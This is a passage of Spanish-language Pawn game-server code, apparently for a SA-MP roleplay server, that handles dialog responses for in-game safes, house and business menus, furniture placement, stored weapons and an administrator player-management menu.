	    				SetPVarInt(playerid,"PuedeSacar",1);
	    				ShowPlayerDialog(playerid,dSacar,DIALOG_STYLE_INPUT,""#CINFO"Caja fuerte",""#CBLANCO"Escribe la cantidad de dinero a retirar","Retirar","Cancelar");
					}
					else return Error(playerid,"La contraseña es INCORRECTA");
				}
			}
		}
		case dCambiarPassCF:
		{
		    if(!response) return 1;
		    if(!strlen(inputtext) || strlen(inputtext) > 30) return ShowPlayerDialog(playerid,dCambiarPassCF,DIALOG_STYLE_INPUT,""#CINFO"Caja fuerte - "#CINFO"Cambiar contraseña",""#CBLANCO"Escribe alguna contraseña (Menor de 30 caracteres)","Aceptar","Cancelar");
		    if(GetPVarInt(playerid,"CajaFuerte") == CF_FACCION)
		    {
				Loop(i,MAX_FACCIONES+1,1)
				{
					if(InfoJugador[playerid][jLider] == i)
					{
						alm(InfoFaccion[i][fContra],inputtext);
						new str[80 + 30];
						AutoRol(playerid,"cambia la contraseña de la caja fuerte");
						format(str,sizeof(str),""#CBLANCO"Cambiaste la contraseña correctamente.\n\tLa nueva contraseña es: "#CINFO"%s",inputtext);
						ShowPlayerDialog(playerid,dError,DIALOG_STYLE_MSGBOX,""#CINFO"Caja fuerte",str,"Cerrar","");
						ActualizarFacciones();
						A_Format(str, "%s cambió contraseña a: %s.", pName(playerid), inputtext);
						new str22[22];
						A_Format(str22, "LOG/CajaFuerte_%d.txt", i);
						Log(str22, str);
					}
				}
			}
		    else if(GetPVarInt(playerid,"CajaFuerte") == CF_NEGOCIO)
		    {
		    	new i = ID_Negocio(playerid);
				InfoNegocio[i][nContra] = udb_hash(inputtext);
				AutoRol(playerid,"cambia la contraseña de la caja fuerte");
				ShowPlayerDialog(playerid,dError,DIALOG_STYLE_MSGBOX,""#CINFO"Caja fuerte",""#CBLANCO"Contraseña fue cambiada","Cerrar","");
				ActualizarNegocio(i);
			}
		    else if(GetPVarInt(playerid,"CajaFuerte") == CF_CASA)
		    {
		    	new i = ID_Casa(playerid);
				InfoCasa[i][cContra] = udb_hash(inputtext);
				AutoRol(playerid,"cambia la contraseña de la caja fuerte");
				ShowPlayerDialog(playerid,dError,DIALOG_STYLE_MSGBOX,""#CINFO"Caja fuerte",""#CBLANCO"Contraseña fue cambiada","Cerrar","");
				ActualizarCasa(i);
			}
			return 1;
		}
		case dRoperoLSMD:
		{
  			if(!response) return 1;
		    switch(listitem)
		    {
			    case 0: ElegirRopa(playerid,274);
			    case 1: ElegirRopa(playerid,275);
			    case 2: ElegirRopa(playerid,276);
			    case 3: ElegirRopa(playerid,70);
			}
		}
		case dMenuNegocio:
		{
		    if(!response) return 1;
			switch(listitem)
			{
			    case 0:
				{
					Dialog(playerid,dCajaFuerte,DIALOG_STYLE_LIST,""#CINFO"Caja fuerte","Ver dinero\nDepositar\nSacar\nCambiar contraseña","Aceptar","Cancelar");
					SetPVarInt(playerid,"CajaFuerte",CF_NEGOCIO);
				}
			    case 1: Dialog(playerid,dNegNombre,DIALOG_STYLE_INPUT,""#CINFO"Negocio",""#CBLANCO"Escribe el nuevo nombre de tu negocio:","Aceptar","Salir");
			    case 2: Dialog(playerid,dNegEntrada,DIALOG_STYLE_INPUT,""#CINFO"Negocio",""#CBLANCO"Escribe el nuevo precio de entrada de tu negocio:","Aceptar","Salir");
			}
		}
		case dNegNombre:
		{
		    if(!response) return 1;
	    	new
				n = ID_Negocio(playerid);

		    if(!strlen(inputtext) || strlen(inputtext) >= MAX_CARACTERES_NAME ) return Dialog(playerid,dNegNombre,DIALOG_STYLE_INPUT,""#CINFO"Negocio",""#CBLANCO"Mo escribiste nada, o el nombre es demasiado largo.","Aceptar","Cancelar");
      		alm(InfoNegocio[n][nNombre],inputtext);
			MensajeF(playerid,-1,"El nombre fue cambiado a "#CPOSITIVO"%s",InfoNegocio[n][nNombre]);
			ActualizarNegocio(n);
			ActualizarNegLabel(n);
			printf("- %s cambió el nombre de su negocio (ID: %d) a: $%d", NombreJugador_(playerid), n, strval(inputtext));
		}
		case dNegEntrada:
		{
		    if(!response) return 1;
	    	new n = ID_Negocio(playerid);
	    	if(strval(inputtext) < 1 || strval(inputtext) > 2000) return Error(playerid,"No puedes ponerle ese precio. (max 2000)");
      		InfoNegocio[n][nPrecioEntrada] = strval(inputtext);
			MensajeF(playerid,-1,"El precio de entrada fue cambiado a "#CPOSITIVO"$%d",InfoNegocio[n][nPrecioEntrada]);
			ActualizarNegocio(n);
			ActualizarNegLabel(n);
			printf("- %s cambió el precio de entrada de su negocio (ID: %d) a: $%d", NombreJugador_(playerid), n, strval(inputtext));
		}
		case dMenuCasa:
		{
		    if(!response) return 1;
			switch(listitem)
			{
			    case 0:
				{
				    if(!EstaEnSuCasa(playerid) && !InfoJugador[playerid][jLiderFam])
				    {
						Dialog(playerid,dCajaFuerte,DIALOG_STYLE_LIST,""#CINFO"Caja fuerte","Ver dinero\nDepositar\nSacar","Aceptar","Cancelar");
						SetPVarInt(playerid,"CajaFuerte",CF_CASA);
					}
					else
					{
						Dialog(playerid,dCajaFuerte,DIALOG_STYLE_LIST,""#CINFO"Caja fuerte","Ver dinero\nDepositar\nSacar\nCambiar contraseña","Aceptar","Cancelar");
						SetPVarInt(playerid,"CajaFuerte",CF_CASA);
					}
				}
			    case 1: Dialog(playerid,dCasaNombre,DIALOG_STYLE_INPUT,""#CINFO"Casa",""#CBLANCO"Escribe el nuevo nombre de tu casa:","Aceptar","Salir");
			    case 2:
				{
				    SetPVarInt(playerid,"C_SArma",0);
					Dialog(playerid,dCasaArmas,DIALOG_STYLE_LIST,""#CINFO"Casa","- Guardar arma\n- Sacar arma","Aceptar","Salir");
				}
				case 3:
				{
				    Dialog(playerid,dCasaMuebles, DIALOG_STYLE_LIST, "- Editar muebles", "- Acomodar muebles\n- Agregar un nuevo mueble\n- Borrar mueble\n- Editar mueble en especifico\n- Ocultar un mueble", "Aceptar", "Cancelar");
				}
				case 4:
				{
				    new n = ID_Casa(playerid);
				    if(n == INVALID_HOUSE_ID) return Error(playerid, "¡Necesitas estar en tu casa!");
					SetPVarInt(playerid,"H_TYPE_HACK", H_TYPE_DOOR_CONFIG);
					SetPVarInt(playerid,"H_HOUSE_ID", n);
					ShowKeyPad(playerid);
					Mensaje(playerid, -1, "Escribe la contraseña para la puerta de tu casa, utiliza las flechas de dirección o W-A-S-D");
				}
			}
		}
		case dCasaPrecio:
		{
		    if(!response) return 1;
  			if(!strval(inputtext)) return ShowPlayerDialog(playerid,dCasaPrecio,DIALOG_STYLE_INPUT,""#CINFO"Casa",""#CBLANCO"Escribe un valor numérico","Aceptar","Cancelar");
			if(strval(inputtext) < 1) return ShowPlayerDialog(playerid,dCasaPrecio,DIALOG_STYLE_INPUT,""#CINFO"Casa",""#CBLANCO"Escribe un número positivo","Aceptar","Cancelar");
  			new n = ID_Casa(playerid);
     		InfoCasa[n][cPrecio] = strval(inputtext);
			MensajeF(playerid,-1,"El precio fue ajustado a "#CPOSITIVO"$%d",InfoCasa[n][cPrecio]);
			ActualizarCasa(n);
		}
		case dCasaNombre:
		{
		    if(!response) return 1;
		    if(!EstaEnSuCasa(playerid)) return Error(playerid,"¡No le puedes cambiar el nombre, solo su dueño puede!");
		    if(!strlen(inputtext) || strlen(inputtext) >= MAX_CARACTERES_NAME ) return Dialog(playerid,dCasaNombre,DIALOG_STYLE_INPUT,""#CINFO"Casa",""#CBLANCO"¡Nombre muy corto, o muy largo!","Aceptar","Cancelar");
   	    	new n = ID_Casa(playerid);
	        alm(InfoCasa[n][cNombre],inputtext);
			MensajeF(playerid,-1,"El nombre fue cambiado a "#CPOSITIVO"%s",InfoCasa[n][cNombre]);
			ActualizarCasa(n);
			ActualizarCasaLabel(n);
		}
		case dCasaArmas:
		{
		    if(!response) return 1;
		    switch(GetPVarInt(playerid,"C_SArma"))
			{
			    case 0:
			    {
					new StrA[45 * 10],Arma[10][40],strI[50];
					switch(listitem)
					{
						case 0:
						{
							Loop(i,10,0)
							{
							    if(!InfoCasa[ID_Casa(playerid)][cArmas][i])
							    {
						         	Arma[i] = ""#CROJO"Nada";
								}
								else
								{
									GetWeaponName(InfoCasa[ID_Casa(playerid)][cArmas][i],Arma[i],18);
								}
						 		format(strI,sizeof(strI),"Slot %d ( "#CVERDE"%s "#CBLANCO")\n",i,Arma[i]);
						  		strins(StrA,strI,strlen(StrA));
							}
							SetPVarInt(playerid,"C_SArma",1);
							Dialog(playerid,dCasaArmas,DIALOG_STYLE_LIST,""#CBLANCO"Elige el slot para editar",StrA,"Aceptar","Cancelar");
						}

						case 1:
						{
							Loop(i,10,0)
							{
							    if(!InfoCasa[ID_Casa(playerid)][cArmas][i])
							    {
						         	Arma[i] = ""#CROJO"Nada";
								}
								else
								{
									GetWeaponName(InfoCasa[ID_Casa(playerid)][cArmas][i],Arma[i],18);
								}
						 		format(strI,sizeof(strI),"Slot %d ( "#CVERDE"%s "#CBLANCO")\n",i,Arma[i]);
						  		strins(StrA,strI,strlen(StrA));
							}
							SetPVarInt(playerid,"C_SArma",2);
							Dialog(playerid,dCasaArmas,DIALOG_STYLE_LIST,""#CBLANCO"Elige el slot para editar",StrA,"Aceptar","Cancelar");
						}
					}
				}
			    case 1:
			    {
			        if(!GetPlayerWeapon(playerid)) return Error(playerid,"¡No tienes un arma en la mano!");
					GetPlayerWeaponData(playerid,GetWeaponSlot(GetPlayerWeapon(playerid)),InfoCasa[ID_Casa(playerid)][cArmas][listitem],InfoCasa[ID_Casa(playerid)][cBalas][listitem]);
					QuitarArma(playerid,GetWeaponSlot(GetPlayerWeapon(playerid)));
					ActualizarCasa(ID_Casa(playerid),false,-1,true);
			    }
				case 2:
				{
				    GivePlayerWeapon(playerid,InfoCasa[ID_Casa(playerid)][cArmas][listitem],InfoCasa[ID_Casa(playerid)][cBalas][listitem]);
                    InfoCasa[ID_Casa(playerid)][cArmas][listitem] = 0;
                    InfoCasa[ID_Casa(playerid)][cBalas][listitem] = 0;
					ActualizarCasa(ID_Casa(playerid),false,-1,true);
				}
			}
		}

		case dCasaMuebles:
		{
		    if(!response) return 1;
			new
				Str[35],
				Str2[sizeof(Str) * MAX_MUEBLES_CASA],
				i = ID_Casa(playerid),
				OBJ_INDEX;

			if(i == INVALID_HOUSE_ID)
			    return 1;

		    if(listitem == 0)
		    {
		        SetPVarInt(playerid,"EditandoMuebles", 1);
				SelectObject(playerid);
			}
			else if(listitem == 1)
			{
				Loop(m, MAX_MUEBLES_CASA, 0)
				{
				    if(InfoCasa[i][cObjModel][m])
				    {
						BuscarModeIndexInt(InfoCasa[i][cObjModel][m], OBJ_INDEX);
				    	A_Format(Str, "%s %s\n", (!InfoCasa[i][cObjPosX][m]) ? (""#CROJO"") : (""#CVERDE""), ObjetosInterior[OBJ_INDEX][2]);
					}
					else Str = ""#CBLANCO"-- VACIO --\n";
					strcat(Str2, Str);
				}
				Dialog(playerid, dColocarMueble, DIALOG_STYLE_LIST, "Agregar mueble", Str2, "Aceptar", "Cancelar");
			}
			else if(listitem == 2)
			{
				Loop(m, MAX_MUEBLES_CASA, 0)
				{
				    if(InfoCasa[i][cObjModel][m])
				    {
						BuscarModeIndexInt(InfoCasa[i][cObjModel][m], OBJ_INDEX);
				    	A_Format(Str, "%s %s\n", (!InfoCasa[i][cObjPosX][m]) ? (""#CROJO"") : (""#CVERDE""), ObjetosInterior[OBJ_INDEX][2]);
					}
					else Str = ""#CBLANCO"-- VACIO --\n";
					strcat(Str2, Str);
				}
				Dialog(playerid, dBorrarMueble, DIALOG_STYLE_LIST, "Borrar un mueble", Str2, "Aceptar", "Cancelar");
			}
			else if(listitem == 3)
			{
				Loop(m, MAX_MUEBLES_CASA, 0)
				{
				    if(InfoCasa[i][cObjModel][m])
				    {
						BuscarModeIndexInt(InfoCasa[i][cObjModel][m], OBJ_INDEX);
				    	A_Format(Str, "%s %s\n", (!InfoCasa[i][cObjPosX][m]) ? (""#CROJO"") : (""#CVERDE""), ObjetosInterior[OBJ_INDEX][2]);
					}
					else Str = ""#CBLANCO"-- VACIO --\n";
					strcat(Str2, Str);
				}
				Dialog(playerid, dEditarMuebleE, DIALOG_STYLE_LIST, "- Editar mueble en espefico", Str2, "Aceptar", "Cancelar");
			}
			else if(listitem == 4)
			{
				Loop(m, MAX_MUEBLES_CASA, 0)
				{
				    if(InfoCasa[i][cObjModel][m])
				    {
						BuscarModeIndexInt(InfoCasa[i][cObjModel][m], OBJ_INDEX);
				    	A_Format(Str, "%s %s\n", (!InfoCasa[i][cObjPosX][m]) ? (""#CROJO"") : (""#CVERDE""), ObjetosInterior[OBJ_INDEX][2]);
					}
					else Str = ""#CBLANCO"-- VACIO --\n";
					strcat(Str2, Str);
				}
				Dialog(playerid, dOcultarMueble, DIALOG_STYLE_LIST, "- Ocultar un mueble", Str2, "Aceptar", "Cancelar");
			}
			return 1;
		}
		case dBorrarMueble:
		{
			if(response)
			{
			    SetPVarInt(playerid,"MUEBLE_BORRAR", listitem);
		    	Dialog(playerid, dBorrarMueble_0, DIALOG_STYLE_MSGBOX, "Confirmar eliminación", ""#CBLANCO"¿Estas seguro de que deseas "#CROJO"eliminar "#CBLANCO"este mueble?","Si", "No");
			}
			else DeletePVar(playerid,"MUEBLE_BORRAR");
		}
		case dBorrarMueble_0:
		{
		    if(!response) return DeletePVar(playerid,"MUEBLE_BORRAR");
		    new
				i = GetPVarInt(playerid,"MUEBLE_BORRAR"),
				h = ID_Casa(playerid);
		    
			if(h == INVALID_HOUSE_ID)
			    return 1;

			DestruirMuebleCasa(h, i);
			
			InfoCasa[h][cObjModel][i] = 0;
			InfoCasa[h][cObjPosX][i] = 0.0;
			InfoCasa[h][cObjPosY][i] = 0.0;
			InfoCasa[h][cObjPosZ][i] = 0.0;
			InfoCasa[h][cObjRotX][i] = 0.0;
			InfoCasa[h][cObjRotY][i] = 0.0;
			InfoCasa[h][cObjRotZ][i] = 0.0;
			GameTextForPlayer(playerid, "~r~mueble eliminado", 3000, 3);
			DeletePVar(playerid,"MUEBLE_BORRAR");
			ActualizarCasa(ID_Casa(playerid), false, i, false);
			return 1;
		}

		case dEditarMuebleE:
		{
		    if(!response) return 1;
			if(!InfoCasa[ID_Casa(playerid)][cObjPosX][listitem]) return Error(playerid,"No puedes editar ese objeto");
			EditPlayerObject(playerid, OBJ_Mueble[playerid][listitem]);
			return 1;
		}

		case dColocarMueble:
		{
		    if(!response) return 1;
		    new
				i = ID_Casa(playerid);

			if(i == INVALID_HOUSE_ID)
			    return 1;

            if(!InfoCasa[i][cObjModel][listitem]) return Error(playerid, "¡No seleccionaste nada!");
            if(InfoCasa[i][cObjPosX][listitem] != 0.0) return Error(playerid, "¡Ese mueble ya está agregado!");

			GetPlayerPos(playerid,InfoCasa[i][cObjPosX][listitem], InfoCasa[i][cObjPosY][listitem], InfoCasa[i][cObjPosZ][listitem]);
			GetPosInFrontOfPlayer(playerid, InfoCasa[i][cObjPosX][listitem], InfoCasa[i][cObjPosY][listitem], 1.0);

			foreach(Player, p)
			{
			    if(CasaActual[p] == i)
			    {
			    	OBJ_Mueble[p][listitem] = CreatePlayerObject(p, InfoCasa[i][cObjModel][listitem],
																	InfoCasa[i][cObjPosX][listitem],
																	InfoCasa[i][cObjPosY][listitem],
																	InfoCasa[i][cObjPosZ][listitem],
																	0.0, 0.0, 0.0);
				}
			}
			SetPVarInt(playerid,"EditandoMuebles", 1);
			OnPlayerSelectObject(playerid, SELECT_OBJECT_PLAYER_OBJECT, OBJ_Mueble[playerid][listitem], InfoCasa[i][cObjModel][listitem], 0, 0, 0);
			ActualizarCasa(ID_Casa(playerid), false, i, false);
		}
		case dOcultarMueble:
		{
		    if(!response) return 1;
		    new
				i = ID_Casa(playerid);

			if(i == INVALID_HOUSE_ID)
			    return 1;

            if(!InfoCasa[i][cObjModel][listitem]) return Error(playerid, "¡No seleccionaste nada!");
            if(InfoCasa[i][cObjPosX][listitem] == 0.0) return Error(playerid, "¡Ese objeto ya está oculto!");

		    InfoCasa[i][cObjPosX][listitem] = 0.0;
		    InfoCasa[i][cObjPosY][listitem] = 0.0;
		    InfoCasa[i][cObjPosZ][listitem] = 0.0;

			foreach(Player, p)
			{
			    if(CasaActual[p] == i)
			    {
			    	DestroyPlayerObject(p, OBJ_Mueble[p][listitem]);
				}
			}

			ActualizarCasa(i, false, listitem, false);
			GameTextForPlayer(playerid,"~w~objeto ~g~ocultado", 4000, 3);
			return 1;
		}

		case dAdmClick:
		{
			if(!response)
			{
				SetPVarInt(playerid,"ADM_Click",0);
			 	return 1;
			}
		    new
				ID = GetPVarInt(playerid,"ClickedID"),Info[40],InfoEx[70],sucess = 1,
				ADM_HEAD[MAX_PLAYER_NAME+30];

			A_Format(ADM_HEAD, ""#CBLANCO"ADMINISTRACIÓN >> "#CHAMBRE"%s", pName(ID));
		    switch(GetPVarInt(playerid,"ADM_Click"))
		    {
				case ADM_EligeSkin:
			    {
			    	if(strval(inputtext) < 0 || strval(inputtext) > 300) return Dialog(playerid,dAdmClick,DIALOG_STYLE_INPUT,ADM_HEAD,""#CBLANCO"Introduce un número: ( = o > 0 & < 300 )","Aceptar","Cancelar");
					SetPlayerSkin(ID,strval(inputtext));
	   				Info = "cambio el skin de";
					sucess++;
				}
				case ADM_EligeInt:
			    {
					SetPlayerInterior(ID,strval(inputtext));
	  				Info = "le cambio el interior a";
					sucess++;
				}
				case ADM_EligeVW:
			    {
					SetPlayerVirtualWorld(ID,strval(inputtext));
	  				Info = "le cambio el virtual world a";
					sucess++;
				}
				case ADM_Vida:
				{
				    switch(listitem)
				    {
						case 0:
						{
						    SetPlayerHealth(ID,100);
						    Info = "curo a";
						}
						case 1:
						{
							SetPlayerHealth(ID,0);
							Info = "asesino a";
						}
					}
				}
				case ADM_Carcel:
				{
					if(0 <= strval(inputtext) <= 2400)
					{
					    SetPVarInt(playerid, "ADM_Click", ADM_CarcelR);
					    SetPVarInt(playerid, "ADM_CarcelTime", strval(inputtext) );
	        			Dialog(playerid,dAdmClick,DIALOG_STYLE_INPUT,ADM_HEAD,""#CBLANCO"Introduce la "#CROJO"RAZÓN "#CBLANCO"del encarcelamiento","Aceptar","Cancelar");
					}
					else
					{
						return Error(playerid, "Entre 0-2400 minutos (60 horas)");
					}
					return 1;
				}
				case ADM_CarcelR:
				{
				    new
						time = GetPVarInt(playerid, "ADM_CarcelTime"),
						Float: Horas =   (time / 60),
						Float: Minutos = (time % 60);

					DeletePVar(playerid, "ADM_CarcelTime");
					MandarCarcel(ID,time,true);
					Mensaje(ID, 1,   "=========================================================================");
					MensajeF(ID, -1, "- Fuiste encarcelado por %s "#CROJO"(%.0f:%.0f horas - Razón: %s)",NombreJugador(playerid), Horas, Minutos, inputtext);
					Mensaje(ID, 1,   "=========================================================================");
					Info = "Encarcelo a";
					format(InfoEx,sizeof(InfoEx),"(%02.0f:%02.0f HS - %s)",Horas, Minutos, inputtext);
					sucess++;
				}
				case ADM_Kick:
				{
					_Kick(ID,pName(playerid),inputtext);
			    	SetPVarInt(playerid,"ADM_Click",0);
			    	return 1;
				}
				case ADM_Ban:
				{
				    Error(playerid,"Sistema deshabilitado. Use "#CINFO"/ban");
			    	SetPVarInt(playerid,"ADM_Click",0);
			    	return 1;
/*				    new Str[128];
					new T[3],H[3];
					gettime(H[0],H[1],H[2]);
					getdate(T[0],T[1],T[2]);
					Info = "baneo a";
					format(InfoEx,sizeof(InfoEx),"(Razón: %s)",inputtext);
					Mensaje(ID,C_NEGRO,"=============================================================================");
					format(Str,sizeof(Str),""#CADMINISTRADOR"BANEADO ( %02d/%02d/%02d  - %02d:%02d:%02d ) "#CBLANCO"Razón: %s",T[2],T[1],T[0],H[0],H[1],H[2],inputtext);
					Mensaje(ID,-1,Str);
					Mensaje(ID,-1,"El administrador que te baneo:");
					Mensaje(ID,C_ROJO,NombreJugador_(playerid));
					Mensaje(ID,-1,"> Si esto fue un error, preciona F8 (Para sacar foto) y subela al foro");
					Mensaje(ID,-1,"Un administrador te desbloqueará tu cuenta y no perderás nada.");
					Mensaje(ID,C_NEGRO,"=============================================================================");
					BanEx(ID,inputtext);
					sucess++;*/
				}
				case ADM_Familia:
				{
					switch(listitem)
					{
					    case 0:
					    {
					        SetPVarInt(playerid,"ADM_Click",ADM_FamRango);
					        Dialog(playerid,dAdmClick,DIALOG_STYLE_INPUT,ADM_HEAD,""#CBLANCO"Introduce el rango deseado para este jugador","Aceptar","Cancelar");
							return 1;
					    }
						case 1:
						{
						    if(!InfoJugador[ID][jMiembroFam] && !InfoJugador[ID][jLiderFam])
						        return Error(playerid, "Ese jugador no tiene familia.");
						        
						    Info = "expulso de su familia a";
						    
						    if(!strcmp(InfoFamilia[ID_Familia(ID)][fLider], pName(ID) ))
						    {
								alm(InfoFamilia[ID_Familia(ID)][fLider], "");
								ActualizarFamilia(ID_Familia(ID));
							}
						    InfoJugador[ID][jRangoFam] = 1;
						    InfoJugador[ID][jMiembroFam] = 0;
						    InfoJugador[ID][jLiderFam] = 0;
							sucess++;
						}
					    case 2:
					    {
					        SetPVarInt(playerid,"ADM_Click",ADM_FamMiembro);
					        new Str[150],Str_[40];
					        Loop(i,sizeof(InfoFamilia),1)
					        {
					            A_Format(Str_,"%s\n",InfoFamilia[i][fNombre]);
					            strcat(Str,Str_);
							}
					        Dialog(playerid,dAdmClick,DIALOG_STYLE_LIST,""#CBLANCO"Selecciona la familia para este jugador",Str,"Aceptar","Cancelar");
							return 1;
					    }
					    case 3:
					    {
					        SetPVarInt(playerid,"ADM_Click",ADM_FamLider);
					        new Str[150],Str_[40];
					        Loop(i,sizeof(InfoFamilia),1)
					        {
					            A_Format(Str_,"%s\n",InfoFamilia[i][fNombre]);
					            strcat(Str,Str_);
							}
					        Dialog(playerid,dAdmClick,DIALOG_STYLE_LIST,""#CBLANCO"Selecciona la familia para este jugador",Str,"Aceptar","Cancelar");
							return 1;
					    }
					}
				}
				case ADM_FamRango:
				{
    				InfoJugador[ID][jRangoFam] = strval(inputtext);
    				Info = "le modifico el rango a";
					format(InfoEx,sizeof(InfoEx),"(Rango %d)",strval(inputtext));
					sucess++;
				}
				case ADM_FamMiembro:
				{
				    if(ID_Faccion(ID)) return Error(playerid, "No está permitido tener Familia y Facción.");
				    new Fam = listitem+1;
				    Info = "le dio miembro de familia a";
				    InfoJugador[ID][jMiembroFam] = Fam;
				    InfoJugador[ID][jLiderFam] = 0;
					format(InfoEx,sizeof(InfoEx),"(Familia %s)",InfoFamilia[Fam][fNombre]);
					sucess++;
				}
				case ADM_FamLider:
				{
				    if(ID_Faccion(ID)) return Error(playerid, "No está permitido tener Familia y Facción.");
				    new Fam = listitem+1;
				    Info = "le dio lider de familia a";
				    InfoJugador[ID][jMiembroFam] = 0;
				    InfoJugador[ID][jLiderFam] = Fam;
				    SetFamLeader(ID, Fam);
					format(InfoEx,sizeof(InfoEx),"(Familia %s)",InfoFamilia[Fam][fNombre]);
					sucess++;
				}
				case ADM_Faccion:
				{
					switch(listitem)
					{
					    case 0:
					    {
					        SetPVarInt(playerid,"ADM_Click",ADM_FacRango);
					        Dialog(playerid,dAdmClick,DIALOG_STYLE_INPUT,ADM_HEAD,""#CBLANCO"Introduce el rango deseado para este jugador","Aceptar","Cancelar");
							return 1;
					    }
						case 1:
						{
						    if(!InfoJugador[ID][jMiembro] && !InfoJugador[ID][jLider])
						        return Error(playerid, "Ese jugador no tiene facción.");

						    Info = "expulso de su facción a";

						    if(!strcmp(InfoFaccion[ID_Faccion(ID)][fLider], pName(ID) ))
						    {
								alm(InfoFaccion[ID_Faccion(ID)][fLider], "");
								ActualizarFacciones();
							}

						    SacarLlavesFaccion(ID);
						    InfoJugador[ID][jRango] = 1;
						    InfoJugador[ID][jMiembro] = 0;
						    InfoJugador[ID][jLider] = 0;
						    sucess++;
						}
					    case 2:
					    {
					        SetPVarInt(playerid,"ADM_Click",ADM_FacMiembro);
					        new Str[150],Str_[40];
					        Loop(i,MAX_FACCIONES,1)
					        {
					            A_Format(Str_,"%s\n",NombreFaccion(i));
					            strcat(Str,Str_);
							}
					        Dialog(playerid,dAdmClick,DIALOG_STYLE_LIST,""#CBLANCO"Selecciona para este jugador",Str,"Aceptar","Cancelar");
							return 1;
					    }
					    case 3:
					    {
							if(ID_Faccion(ID))
							    return Error(playerid, "El jugador ya tiene facción, primero debes expulsarlo.");

					        SetPVarInt(playerid,"ADM_Click",ADM_FacLider);
					        new Str[150],Str_[40];
					        Loop(i,MAX_FACCIONES,1)
					        {
					            A_Format(Str_,"%s\n",NombreFaccion(i));
					            strcat(Str,Str_);
							}
					        Dialog(playerid,dAdmClick,DIALOG_STYLE_LIST,""#CBLANCO"Selecciona la facción para este jugador",Str,"Aceptar","Cancelar");
							return 1;
					    }
					}
				}
				case ADM_FacRango:
				{
    				InfoJugador[ID][jRango] = strval(inputtext);
    				Info = "le modifico el rango a";
					format(InfoEx,sizeof(InfoEx),"(Rango %d)",strval(inputtext));
					sucess++;
				}
				case ADM_FacMiembro:
				{
					if(ID_Faccion(ID))
					    return Error(playerid, "El jugador ya tiene facción, primero debes expulsarlo.");

				    if(ID_Familia(ID)) return Error(playerid, "No está permitido tener Familia y Facción.");

				    new Fac = listitem+1;
				    Info = "le dio miembro de facción a";
				    InfoJugador[ID][jMiembro] = Fac;
					InfoJugador[ID][jLider] = 0;
					format(InfoEx,sizeof(InfoEx),"(Facción %s)",NombreFaccion(Fac));
					sucess++;
				}
				case ADM_FacLider:
				{
					if(ID_Faccion(ID))
					    return Error(playerid, "El jugador ya tiene facción, primero debes expulsarlo.");

				    if(ID_Familia(ID)) return Error(playerid, "No está permitido tener Familia y Facción.");

				    Info = "le dio lider de facción a";
				    InfoJugador[ID][jLider] = listitem+1;
					InfoJugador[ID][jMiembro] = 0;
					SetFacLeader(ID, listitem+1);
					DarLlavesFaccion(ID);
					format(InfoEx,sizeof(InfoEx),"(Facción %s)",NombreFaccion(listitem+1));
					sucess++;
				}
				case ADM_Dinero:
				{
				    switch(listitem)
				    {
				        case 0:
				        {
					        SetPVarInt(playerid,"ADM_Click",ADM_FijDin);
					        Dialog(playerid,dAdmClick,DIALOG_STYLE_INPUT,ADM_HEAD,""#CBLANCO"Introduce el dinero para este jugador","Aceptar","Cancelar");
						}
				        case 1:
				        {
					        SetPVarInt(playerid,"ADM_Click",ADM_QuitDin);
					        Dialog(playerid,dAdmClick,DIALOG_STYLE_INPUT,ADM_HEAD,""#CBLANCO"Introduce el dinero que le quitaras a este jugador","Aceptar","Cancelar");
						}
				        case 2:
				        {
					        SetPVarInt(playerid,"ADM_Click",ADM_DarDin);
					        Dialog(playerid,dAdmClick,DIALOG_STYLE_INPUT,ADM_HEAD,""#CBLANCO"Introduce el dinero que le darás a este jugador","Aceptar","Cancelar");
						}
					}
					return 1;
				}
				case ADM_FijDin:
				{
					new Val = strval(inputtext);
				    if(Val < 1) return Error(playerid,"¡El número debe ser positivo!");
    				ResetPlayerMoney(ID);
					GivePlayerMoney(ID,strval(inputtext));
					Info = "le fijó el dinero a";
					format(InfoEx,sizeof(InfoEx),"($%d)",strval(inputtext));
					sucess++;
				}
				case ADM_QuitDin:
				{
					new Val = strval(inputtext);
				    if(Val < 1) return Error(playerid,"¡El número debe ser positivo!");
					GivePlayerMoney(ID,-Val);
					Info = "le quitó dinero a";
					format(InfoEx,sizeof(InfoEx),"($%d)",Val);
					sucess++;
				}
				case ADM_DarDin:
				{
				    return Error(playerid, "¡No estás en el Horno!");

/*					GivePlayerMoney(ID,strval(inputtext));
					Info = "le agregó dinero a";
					format(InfoEx,sizeof(InfoEx),"($%d)",strval(inputtext));
					sucess++;
*/
				}
				default:
				{
				    sucess = 0;
				}
			}
			if(sucess)
			{
				SetPVarInt(playerid,"ADM_Click",0);
				new strADM[128];
				A_Format(strADM,"[ADMINISTRACIÓN] "#CBLANCO"> %s %s %s "#CADMINISTRADOR"%s",NombreJugador_(playerid),Info,NombreJugador_(ID),InfoEx);
				MensajeAdmin(C_ROJO,strADM,Ayudante);
				A_Format(strADM,"%s %s %s %s",NombreJugador_(playerid),Info,NombreJugador_(ID),InfoEx);
				Log("LOG/AdminClick.txt", strADM);
				return 1;
			}
		    switch(listitem)
		    {
		        case 0:
		        {
		            new
		                Float: Pos[3];

		            GetPlayerPos(ID,Pos[0],Pos[1],Pos[2]);
					if(IsPlayerInAnyVehicle(playerid)) SetVehiclePos(GetPlayerVehicleID(playerid),Pos[0],Pos[1],Pos[2]+1);
					else SetPlayerPos(playerid,Pos[0],Pos[1],Pos[2]+1);
					Info = "fue a";
					SetPlayerInterior(playerid,GetPlayerInterior(ID));
					SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(ID));
				}
				case 1:
				{
					if(GetPVarInt(ID,"Congelado") == 0)
					{
					    CongelarEx(ID);
					    SetPVarInt(ID,"Congelado",1);
						Info = "congelo a";
					}
					else
					{
					    Descongelar(ID);
					    SetPVarInt(ID,"Congelado",0);
						Info = "descongelo a";
					}
				}
				case 2:
				{
				    GetPlayerPos(ID,InfoJugador[ID][jPosX],InfoJugador[ID][jPosY],InfoJugador[ID][jPosZ]);
				    SetPlayerPos(ID,InfoJugador[ID][jPosX],InfoJugador[ID][jPosY],InfoJugador[ID][jPosZ]+2);
					Info = "bofeteo a";
				}
				case 3:
				{
				    if(GetPVarInt(ID,"Muteado") == 0)
				    {
				    	SetPVarInt(ID,"Muteado",1);
				    	Info = "muteo a";
					}
					else
					{
				    	SetPVarInt(ID,"Muteado",0);
				    	Info = "desmuteo a";
					}
				}
				case 4:
				{
					SetPVarInt(playerid,"ADM_Click",ADM_EligeSkin);
					Dialog(playerid,dAdmClick,DIALOG_STYLE_INPUT,ADM_HEAD,""#CBLANCO"Introduce el skin para este jugador","Aceptar","Cancelar");
